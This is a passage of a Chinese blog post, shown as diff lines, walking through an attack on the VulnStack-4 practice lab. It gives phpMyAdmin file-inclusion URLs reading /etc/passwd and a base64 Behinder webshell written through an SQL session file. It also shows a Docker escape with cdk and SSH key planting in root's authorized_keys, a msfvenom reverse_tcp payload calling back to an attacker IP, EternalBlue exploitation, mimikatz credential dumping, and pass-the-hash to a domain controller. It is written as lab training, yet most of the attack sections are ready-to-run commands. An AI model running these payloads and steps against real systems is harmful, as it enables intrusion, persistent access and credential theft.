+                      alt="在这里插入图片描述"
+                ></p>
+<p>可以看到，phpmyadmin服务的版本为 <strong>4.8.1</strong> ，数据库版本为&#96;<strong>MySQL 5.5.62版本</strong></p>
+<ul>
+<li><code>CVE-2018-12613（远程文件包含）</code>：构造index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd读取敏感文件</li>
+<li><code>CVE-2018-12615（SQL 注入）</code>：在db_central_columns.php中注入 SQL 语句，如?db&#x3D;mysql&amp;table&#x3D;user&amp;column_name&#x3D;user%27+UNION+SELECT+1,2,3,4,5,6,7,8,9,10–+</li>
+<li><code>弱密码 / 暴力破解</code>：使用 Hydra 等工具爆破登录口，获取后台权限</li>
+</ul>
+<blockquote>
+<p>所以，我们可以通过phpMyAdmin漏洞POC检测该phpMyAdmin框架是否存在相关的漏洞；</p>
+</blockquote>
+<p>随后尝试访问<a class="link"   href="http://192.168.44.128:2003/index.php?target=db_sql.php%253f/../../../../../../etc/passwd%EF%BC%8C**%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8**%EF%BC%9A" >http://192.168.44.128:2003/index.php?target=db_sql.php%253f/../../../../../../etc/passwd，**发现漏洞存在**：<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?target=db_sql.php%253f/../../../../../../etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="1423e2a998a9418bbcd8e092f869948f.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="文件包含漏洞获取服务器权限"><a href="#文件包含漏洞获取服务器权限" class="headerlink" title="文件包含漏洞获取服务器权限"></a>文件包含漏洞获取服务器权限</h3><blockquote>
+<p><strong>原理：</strong></p>
+<ul>
+<li>我们在数据库SQL模块输入命令后，数据库系统会在后台随机生成一个<code>session文件</code>；</li>
+<li>而临时session文件名可通过Burp Suite抓取数据包获得；</li>
+<li>临时session文件保存在<code>/tmp目录</code>下，所以构造并访问URL进行文件包含漏洞攻击；</li>
+<li>所以我们可以通过类似于<code>日志注入</code>的方法来上传Webshell；</li>
+</ul>
+</blockquote>
+<p>比如执行SQL语句时：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f15598a666db4fc3accbf8ecd1b0b0ba.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f930494e5c2d4b8886a7a422a449a6bd.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>访问&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..<code>/tmp/sess_73adf43fa469e01bc73f6d0edccd7702</code></p>
+<p>可以看到确实可以<strong>未授权访问</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="0d283dda67f84ecaa5db69158b1dcb56.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<blockquote>
+<p>基于上述原理，我们将Webshell语句写入SQL语句也是一件很容易的事情；</p>
+</blockquote>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php echo &#x27;</span><span class="built_in">echo</span> <span class="string">&quot;&lt;?php eval(base64_decode(冰蝎3 webshell base64内容)); ?&gt;&quot;</span> &gt; /var/www/html/shell3.php<span class="string">&#x27;;?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我的payload</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php echo \&#x27;</span><span class="built_in">echo</span> <span class="string">&quot;&lt;?php eval(base64_decode(PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7Lyror6Xlr4bpkqXkuLrov57mjqXlr4bnoIEzMuS9jW1kNeWAvOeahOWJjTE25L2N77yM6buY6K6k6L+e5o6l5a+G56CBcmViZXlvbmQqL3Nlc3Npb24ucHV0VmFsdWUoInUiLGspO0NpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KDIsbmV3IFNlY3JldEtleVNwZWMoay5nZXRCeXRlcygpLCJBRVMiKSk7bmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7fSU+)); ?&gt;&quot;</span> &gt; /var/www/html/11113.php\&#x27;;?&gt;<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure></div>
+<p>结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c92cf6556b484163a8fecde797d5d7c7.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>相应的文件为：&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..<strong>&#x2F;tmp&#x2F;sess_73adf43fa469e01bc73f6d0edccd7702</strong></p>
+<p>它将被写入&#x2F;var&#x2F;www&#x2F;html&#x2F;shell3.php中；使用冰蝎3 webshell管理工具连接<code>http://192.168.96.21:2003/shell3.php</code>即可连接成功；</p>
+<hr>
+<h2 id="Docker服务器逃逸"><a href="#Docker服务器逃逸" class="headerlink" title="Docker服务器逃逸"></a>Docker服务器逃逸</h2><h3 id="Struts2服务"><a href="#Struts2服务" class="headerlink" title="Struts2服务"></a>Struts2服务</h3><p>这里我们选择struts2服务的冰蝎shell进入，查看当前主机的系统，环境，内核版本等基本信息：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="de7624bc599f42bf8bb8dd06d0e3bbbc.png"
+                      alt="在这里插入图片描述"
+                ><br>可以看到当前主机为一台低版本的Ubuntu主机</p>
+<p>通过虚拟命令行执行如下命令：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name .dockerenv</span><br></pre></td></tr></table></figure></div>
+<p>该命令用于在当前服务器上查找是否存在.dockerenv文件。如果当前服务器上存在.dockerenv文件，则输出.dockerenv文件的绝对路径;</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="6e14fd493950445d9e57aaebab3a1868.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>结果如图，在当前服务器上查找到了<code>.dockerenv</code>文件，这代表我们获得的Tomcat服务器权限是Docker容器权限。</p>
+<blockquote>
+<p>由于Docker容器是与物理机隔离的，所以我们需要进行Docker逃逸。</p>
+<ul>
+<li><strong>Docker逃逸</strong>：是指利用Docker容器可能存在的不安全配置，将获得的Docker容器权限转变为物理机权限；</li>
+</ul>
+</blockquote>
+<p>这里我们在Docker容器内可以通过使用cdk进行不安全配置扫描。<code>cdk</code>是一个开源的Docker容器渗透工具包：</p>
+<p><strong>作用</strong>：cdk可以<code>检测当前Docker容器内是否存在不安全的配置和漏洞，并可以通过不安全的配置和漏洞进行Docker逃逸；</code></p>
+<p>下载后将工具上传到目标机器：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="6bddf5141b09476bad1f6c13c575c7bf.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 赋权</span></span><br><span class="line"><span class="built_in">chmod</span> +x cdk</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">./cdk evaluate --full</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="cf7b2360c23c47a58c7812828d48f76d.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>未发现当前Docker容器内存在不安全的配置和漏洞。</p>
+<h3 id="Tomcat服务"><a href="#Tomcat服务" class="headerlink" title="Tomcat服务"></a>Tomcat服务</h3><p>这里我们选择tomcat服务的冰蝎shell进入，其他步骤同理：</p>
+<p>当前Docker容器是以特权模式启动的，所以可以使用<code>mount命令</code>将物理机根目录挂载到Docker容器中的某个目录中：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 赋权</span></span><br><span class="line"><span class="built_in">chmod</span> +x cdk</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">./cdk evaluate --full</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="fb6e31b8e1084b7d888ca9ffbb006234.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 挂载目录</span></span><br><span class="line">./cdk run mount-disk</span><br></pre></td></tr></table></figure></div>
+<p>该命令首先会在Docker容器中的&#x2F;tmp目录下生成一个cdk_xxxxx文件（xxxxx为随机字母组成），再将物理机的根目录挂载到&#x2F;tmp&#x2F;cdk_xxxxx目录下。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="e97c66c68a714816b2c6592dd197f050.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line">/tmp/ &gt;<span class="built_in">cd</span> cdk_lrGoO</span><br><span class="line"></span><br><span class="line">/tmp/cdk_lrGoO &gt;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="54bbcb2d52cb4ae995cffb11342f94ad.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>物理机根目录挂载到&#x2F;tmp&#x2F;cdk_lrGoO后，可以通过写计划任务或写<code>SSH密钥</code>的方式获取物理机权限。</p>
+<h3 id="写入SSH密钥获取权限"><a href="#写入SSH密钥获取权限" class="headerlink" title="写入SSH密钥获取权限"></a>写入SSH密钥获取权限</h3><p>于是我们在kali上生成，直接回车：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="e36e274e919c44619962ffe896216a15.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>密钥文件已生成在&#x2F;root&#x2F;.ssh&#x2F;目录下；</p>
+<p>查看SSH公钥内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="94d536d6807341608390799dc587a83e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>回到Tomcat服务器，之前已经将<strong>物理机的根目录</strong>挂载到&#x2F;tmp&#x2F;dk_ceufh目录下，再将SSH公钥内容写入到物理机&#x2F;root&#x2F;.ssh&#x2F;目录下的<code>authorized_keys文件</code>：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/cdk_lrGoO/root/.ssh/</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f66e0fd235f74b428a5066f9a622e3e8.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/cdk_lrGoO/root/.ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 权限必须为700（仅root可读写执行）</span></span><br><span class="line"><span class="built_in">chmod</span> 700 /tmp/cdk_lrGoO/root/.ssh</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGCWU407UEwvm75WC+Akg6jHkpXx9mj/36uqs5TUBHnEa421gyCnkDnYSru6yneucVcUuQq+vlGJl3S4ST07Fkc9IC4gDuKD+mZsNeGjSJGJ5jhIVpEOKxakHB1VqSGS0PA6Q53pQ5p+lw0vvzwhh0sFIpcgAkoYTHdt88mGylaqaWQ0xDKV4QYArt6qyb4q1MoLzyoCdSb1bzpqRJ1wK3+nSuJM9RVfeHAgwvZhV1lbdFbsNGcE2L6EW8MOpX9e+pzIEUfSubGVSuNlUrwprO5mAuD3l/LoDk23V1MHVgEtmnQfuAwY0WdE2hOUovqclwFDIuD1kqpgoKpnqOsuqa1rE7pML+vyqJ7X3vEgzd+9W7WFhrZgcUWPWp+lX7QwCFJ3WvyA/uOoElBi9arGC+j8Xg5XD6Shpm4+zTRjZJm4vaaL6wkjIe3VhGE564txv+xb34tucOB7L0zui/fZWxzvckt/vsCPEmZEaAeyJ8RdQp6Rz+5h5hfKtJJyTqu7U= root@kali&#x27;</span> &gt; /tmp/cdk_lrGoO/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检验</span></span><br><span class="line"><span class="built_in">cat</span> /tmp/cdk_lrGoO/root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f9a5d91469a84d37894969f491496765.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>之后就可以使用SSH私钥登录物理机了；（复制kali的<code>id_rsa</code>即可）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="e7613b591ead44dd8cec64d1ed1ea1ff.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>可以看到成功登上：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="91695c101df9466b88345e411e1aca2a.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="phpmyadmin服务"><a href="#phpmyadmin服务" class="headerlink" title="phpmyadmin服务"></a>phpmyadmin服务</h3><p>这个数据库也是同理，不过由于Web服务器的版本为：<code>Linux 09dd4e5bfa91 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 GNU/Linux</code> 所以可以使用<strong>脏牛内核漏洞</strong>来进行提取；</p>
+<p>具体步骤可以看这几篇文章（写了很多次），这里就不再演示：</p>
+<ul>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73812072/article/details/157973096?spm=1011.2415.3001.5331" >内网横向——VulnStack-3内网靶场横向提权详细教程(Joomla框架，MySQL日志注入，socks代理，PTH获取NTLM，Zerologon获取DC权限)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73812072/article/details/155023122?spm=1011.2415.3001.5331" >渗透测试——Kioptrix3靶机多种方法渗透提权（脏牛漏洞提权，手把手详细教程）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</li>
+</ul>
+<hr>
+<h2 id="内网横向——配置socks代理"><a href="#内网横向——配置socks代理" class="headerlink" title="内网横向——配置socks代理"></a>内网横向——配置socks代理</h2><h3 id="MSF配置代理"><a href="#MSF配置代理" class="headerlink" title="MSF配置代理"></a>MSF配置代理</h3><p>这里我们对Web服务器信息搜集后，发现存在<strong>两个网段</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="2a5b2d016b664e249c0e03ffc4c4c751.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>所以我们可以使用任何方法来配置socks代理：CS，MSF，stowaway，<code>frp</code>等；</p>
+<blockquote>
+<ul>
+<li>想用Linux打内网，就用MSF，CS等；</li>
+<li>想用Windows打内网，就用<code>proxifier</code>；</li>
+</ul>
+</blockquote>
+<p>这里我使用<strong>MSF</strong>，毕竟用得比较多：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.44.129 LPORT=5555 -f exe &gt; MSF.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立监听</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.44.129</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="feacc2baf4fa454ba59d99a3b3623fb3.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>随后将生成的payload上传到目标机器，然后执行，即可返回一个会话session：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="248b71dead8541e1b172a27aa7a7d2a1.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="ee594461fbf74622b701d88b52701b61.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>接下来我们就可以对内网网段是否还有其他主机信息扫描了：</p>
+<p>为了探测10.10.10.0&#x2F;24网段其他主机的信息，需要添加相应的网段路由：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> SRVPORT 1081</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f0e67b4a36964cc0bfe00ff343adfa27.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>配置好路由之后就可以对内网存活的主机进行探测了：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.0-255</span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<p>得到结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="d97e65070b7d4228a064c1c560e03364.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>发现了两台新主机：10.10.10.25和10.10.10.26并且均为<strong>Windows主机</strong>；</p>
+<h3 id="proxifier扫描"><a href="#proxifier扫描" class="headerlink" title="proxifier扫描"></a>proxifier扫描</h3><p>Windows系统也是一样的：（收集到信息还比MSF更详细一些：域名，主机名等）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="ec1549791fbc4a768fb9998e0ec3e292.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="a1668b6c4cef4996aafc752b55352122.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h2 id="横向内网PC主机"><a href="#横向内网PC主机" class="headerlink" title="横向内网PC主机"></a>横向内网PC主机</h2><ul>
+<li>利用MSF对Windows服务器445端口的SMB服务进行漏洞检测</li>
+<li>根据工具对内网存活主机的扫描结果，得知Windows 7主机10.10.10.25开启了445端口，即SMB服务。因此，通过Metasploit尝试对<code>10.10.10.25</code>进行MS17-010漏洞检测：</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="52bfd4fcbb0649a3b22f607e83e9dbf6.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>这里我们使用exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternal-blue模块进行漏洞测试。</p>
+<blockquote>
+<p>因为10.10.10.25在内部网络中，所以测试模块exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue的payload要选择正向payload，即windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp。</p>
+</blockquote>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 10.10.10.25</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<p>成功返回内网主机的<strong>最高权限SYSTEM</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c219737cbd40421a83a540f524ae64a0.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<blockquote>
+<p>这里我将MSF的会话权限转换到CS，使用的模块为：</p>
+</blockquote>
+<h3 id="mimikatz获取NTLM哈希"><a href="#mimikatz获取NTLM哈希" class="headerlink" title="mimikatz获取NTLM哈希"></a>mimikatz获取NTLM哈希</h3><p>我们得到内网主机PC的最高权限后，就可以上传<code>mimikatz</code> 来收集用户的Hash值：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 上传 mimikatz.exe 到目标主机（路径根据你的环境调整）</span></span><br><span class="line">meterpreter &gt; upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Windows\\Temp\\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 进入目标系统的命令行</span></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 切换到上传目录并执行 mimikatz</span></span><br><span class="line">C:\Windows\Temp&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 在 mimikatz 中执行以下命令获取哈希</span></span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::lsa /inject  <span class="comment"># 导出域内所有用户哈希</span></span><br><span class="line">sekurlsa::logonpasswords  <span class="comment"># 获取当前登录用户的凭证</span></span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="6e4c8af517dc4c60beee33db2094ded5.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>此时我们获得了内网PC主机的NTLM Hash值；</p>
+<h3 id="使用PTH横向域控"><a href="#使用PTH横向域控" class="headerlink" title="使用PTH横向域控"></a>使用PTH横向域控</h3><p>执行命令，运行 exploit&#x2F;windows&#x2F;smb&#x2F;psexec 模块，设置正向 payload，设置测试目标为10.10.10.26：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.26</span><br></pre></td></tr></table></figure></div>
+<p>输入SMBUser和SMBPass:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="078bb185ef494c9894881b62b4326199.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>等待PTH攻击过程结束后，成功获取另一台主机域控DC的权限；</p>
+<p>总结一下：</p>
+<ul>
+<li>在MSF添加了网段<strong>10.10.10.0&#x2F;24</strong>的路由后，使用MSF自带的MS17-010模块对10.10.10.25（内网Win7主机)  进行测试并成功获得其会话；</li>
+<li>在该服务器上进行域内信息收集，发现<strong>10.10.10.26域控DC</strong>是域控服务器，它在域内还有另一台主机（Web主机：192.168.44.128、10.10.10.24）。</li>
+<li>在域控服务器的MSF session中利用smart_hashdump模块将域内所有用户的密码哈希导出，之后通过PTH攻击获得域内另一台主机；</li>
+</ul>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们来对这次实践中用到的知识点和操作方法进行重新梳理：</p>
+<ul>
+<li><strong>Struts2 安全测试</strong>：借助 S2-045 高危漏洞对 Struts2 应用发起攻击，从而获取该应用所在服务器的控制权。</li>
+<li><strong>Tomcat 安全测试</strong>：通过 Tomcat 存在的任意文件上传漏洞实施攻击，进而取得 Tomcat 应用服务器的操作权限。</li>
+<li><strong>phpMyAdmin 安全测试</strong>：借助任意文件包含漏洞对 phpMyAdmin 应用进行渗透，成功获取该应用服务器的控制权限。</li>
+<li><strong>Docker 容器逃逸</strong>：针对 Docker 容器的配置缺陷展开利用，实现从容器环境逃逸至内网宿主机，并获取其控制权。</li>
+<li><strong>MSF 内网代理配置</strong>：使用 Metasploit 框架配置内网代理，打通网络边界，为后续渗透操作铺路。</li>
+<li><strong>Windows 密码哈希提取</strong>：借助 MSF 的 smart_hashdump 模块，从内网 Windows 服务器（尤其是域控制器）中导出用户密码哈希值。</li>
+<li><strong>内网端口探测</strong>：对内网环境中的其他服务器开展端口扫描，识别并定位可作为攻击入口的开放端口。</li>
+<li><strong>PTH 攻击与 CS 会话迁移</strong>：在获取到域内服务器的密码哈希后，通过 Pass-the-Hash（PTH）攻击横向移动，控制其他域内服务器，并将其会话迁移至 Cobalt Strike。</li>
+</ul>
+<blockquote>
+<p>期待下次再见；</p>
+</blockquote>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 内网提权教程——VulnStack-4靶场内网横向解析(Struts2，Tomcat，phpmyadmin漏洞利用，Dockers容器逃逸，Socks代理内网，PTH横向)</li>
+        <li><strong>作者:</strong> W1nner丶</li>
+        <li><strong>创建于
+                :</strong> 2026-02-13 18:27:15</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-06-04 12:31:24
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://tamoon1.github.io/2026/02/13/Internal-network-4/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                [object Object]
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8F%90%E6%9D%83/">#内网横向提权</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/Internal-network-penetration/">#Internal network penetration</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
